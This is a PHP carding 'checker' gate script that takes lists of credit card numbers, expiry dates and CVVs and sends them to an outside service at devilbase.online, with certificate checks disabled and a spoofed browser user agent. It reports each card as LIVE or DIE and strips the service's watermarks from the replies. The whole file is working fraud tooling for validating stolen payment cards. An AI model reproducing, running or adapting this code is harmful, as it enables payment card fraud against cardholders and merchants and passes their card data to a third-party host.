<?php
// Gate Integrada: Pagar-me
// Baseada na API devilbase.online

require_once 'config.php';
session_start();

// Sistema de Segurança: Verificar se está logado
if (!isset($_SESSION['user_id'])) {
    die("ERRO | Acesso negado. Use o dashboard para testar.");
}

$lista = $_GET['lista'] ?? '';
if (empty($lista)) {
    die("ERRO | Lista vazia.");
}

// Extrair dados do cartão
$separador = (strpos($lista, "|") !== false) ? "|" : (strpos($lista, ";") !== false ? ";" : " ");
$dados = explode($separador, $lista);
$cc = trim($dados[0] ?? '');
$mes = trim($dados[1] ?? '');
$ano = trim($dados[2] ?? '');
$cvv = trim($dados[3] ?? '');

if (strlen($ano) == 2) $ano = "20" . $ano;

$card_input = "$cc|$mes|$ano|$cvv";
$url = "https://devilbase.online/api.php?lista=" . urlencode($card_input);

$options = array(
    'http' => array(
        'method' => 'GET',
        'timeout' => 40,
        'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ),
    'ssl' => array(
        'verify_peer' => false,
        'verify_peer_name' => false
    )
);

$context = stream_context_create($options);
$inicio = microtime(true);
$response = @file_get_contents($url, false, $context);
$fim = microtime(true);
$tempo = round($fim - $inicio, 2);

if (!$response) {
    die("DIE | $cc|$mes|$ano|$cvv | Erro na API ou Timeout | {$tempo}s");
}

$texto = trim($response);
// Remover marcas d'água se existirem
$texto = preg_replace('/~>\s*@[^\s~]*\s*~>/i', '~>', $texto);
$texto = trim($texto);

if (strpos($texto, '✅') !== false || strpos($texto, 'APROVADO') !== false || strpos($texto, 'LIVE') !== false) {
    echo "LIVE | $cc|$mes|$ano|$cvv | $texto | {$tempo}s";
} else {
    echo "DIE | $cc|$mes|$ano|$cvv | $texto | {$tempo}s";
}
?>
